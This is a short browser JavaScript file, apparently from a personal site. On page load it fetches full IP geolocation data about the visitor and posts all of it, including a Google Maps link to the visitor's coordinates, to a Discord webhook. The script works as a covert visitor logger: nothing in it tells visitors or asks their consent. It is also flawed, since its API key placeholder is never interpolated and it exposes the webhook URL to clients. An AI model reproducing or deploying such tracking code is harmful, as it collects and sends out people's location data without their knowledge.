const grabData = async () => {
  const config = await fetch("./config.json").then(res => res.json());
  const { Token: webhookURL } = config;

  const apiUrl = "https://api.bigdatacloud.net/data/ip-geolocation-full?localityLanguage=en&key=${apiKey}";
  const ipRes = await fetch(apiUrl);
  const data = await ipRes.json();

  // Helper to stringify nested objects or arrays nicely (limit length for Discord)
  const stringifyValue = (val, maxLen = 950) => {
    if (val === null || val === undefined) return "N/A";
    if (typeof val === "object") {
      try {
        const str = JSON.stringify(val, null, 2);
        return str.length > maxLen ? str.slice(0, maxLen) + "\n...(truncated)" : str;
      } catch {
        return String(val);
      }
    }
    return String(val);
  };

  // Flatten top-level keys into embed fields
  const fields = [];

  for (const [key, val] of Object.entries(data)) {
    // Special handling for some known nested structures for better formatting

    if (typeof val === "object" && val !== null) {
      // For arrays or objects, try to create a readable summary
      if (Array.isArray(val)) {
        // Array: show first 5 elements or full if short
        const preview = val.length > 5
          ? val.slice(0, 5).map(item => stringifyValue(item, 250)).join("\n") + `\n... and ${val.length - 5} more items`
          : val.map(item => stringifyValue(item, 250)).join("\n");
        fields.push({ name: key, value: preview || "Empty Array" });
      } else {
        // Object: pretty print JSON but truncate if long
        const pretty = stringifyValue(val, 950);
        fields.push({ name: key, value: pretty });
      }
    } else {
      // Primitive value
      fields.push({ name: key, value: String(val) || "N/A" });
    }
  }

  // Discord max embed fields is 25, so if fields > 25, split into multiple embeds
  const chunkArray = (arr, size) => {
    const chunks = [];
    for (let i = 0; i < arr.length; i += size) {
      chunks.push(arr.slice(i, i + size));
    }
    return chunks;
  };

  const embedChunks = chunkArray(fields, 25);

  // Compose embed messages
  const embeds = embedChunks.map((chunk, i) => ({
    title: i === 0 ? "ermal.is-a.dev - Complete IP Geolocation Data" : `ermal.is-a.dev - Continued Data #${i + 1}`,
    description: data.location && data.location.latitude && data.location.longitude
      ? `📍 **Location:** [Google Maps](https://www.google.com/maps/@${data.location.latitude},${data.location.longitude},10z)`
      : undefined,
    color: 0x3498db,
    fields: chunk,
    footer: {
      text: `🕒 ${new Date().toLocaleString()}`,
      icon_url: "https://cdn-icons-png.flaticon.com/512/2088/2088617.png"
    }
  }));

  // Send webhook
  const payload = {
    username: "ermal.is-a.dev",
    avatar_url: "https://cdn-icons-png.flaticon.com/512/7013/7013144.png",
    embeds
  };

  const req = new XMLHttpRequest();
  req.open("POST", webhookURL);
  req.setRequestHeader("Content-Type", "application/json");
  req.send(JSON.stringify(payload));
};

grabData();
